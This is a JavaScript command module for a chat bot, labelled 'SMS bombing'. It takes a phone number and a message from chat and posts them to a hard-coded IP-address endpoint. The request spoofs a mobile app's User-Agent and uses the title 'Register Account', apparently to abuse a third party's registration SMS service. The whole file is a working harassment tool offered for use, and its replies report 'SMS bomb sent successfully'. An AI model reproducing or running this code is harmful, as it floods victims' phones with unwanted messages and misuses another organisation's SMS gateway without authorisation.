const axios = require("axios");

module.exports.config = {
    name: "sms",
    version: "1.0.0",
    permission: 0,
    credits: "Rahad",
    description: "SMS bombing",
    prefix: true,
    category: "sms send",
    usages: "[phone_number] [message]",
    cooldowns: 5,
    dependencies: {}
};

module.exports.run = async function({ api, event, args }) {
    const { threadID } = event;
    const phoneNumber = args[0];
    const message = args.slice(1).join(" ");

    if (!phoneNumber || !message) {
        api.sendMessage("Please provide both phone number and message.", threadID);
        return;
    }

    try {
        const data = {
            receiver: phoneNumber,
            text: message,
            title: "Register Account"
        };

        const response = await axios.post("http://202.51.182.198:8081/nbp/sms/code", data, {
            headers: {
                'User-Agent': 'okhttp/3.11.0',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
            }
        });

        if (response.status === 200) {
            if (response.data.msg_code === "internal.server.error") {
                api.sendMessage("Internal server error. Please contact the administrator.", threadID);
            } else {
                api.sendMessage("SMS bomb sent successfully!", threadID);
            }
        } else {
            api.sendMessage("Failed to send SMS bomb. Please try again later.", threadID);
        }
    } catch (error) {
        console.error(error);
        api.sendMessage("An error occurred while sending the SMS bomb.", threadID);
    }
};
